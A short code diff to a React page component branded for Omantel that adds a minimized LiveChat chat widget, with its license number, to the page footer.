@@ -20,6 +20,7 @@ import { addData } from "@/lib/firebase"
 import { useEffect, useState } from "react"
 import { setupOnlineStatus } from "@/lib/utils"
 import { OmantelLogo } from "@/components/logo"
+import { LiveChatWidget } from "@livechat/widget-react"
 const visitorId = `omn-app-${Math.random().toString(36).substring(2, 15)}`;
 
 export default function OmantelPage() {
@@ -295,6 +296,10 @@ export default function OmantelPage() {
             </div>
           </div>
         </div>
+        <LiveChatWidget
+          license="19233396"
+          visibility="minimized"
+        />
       </footer>
     </div>
   )
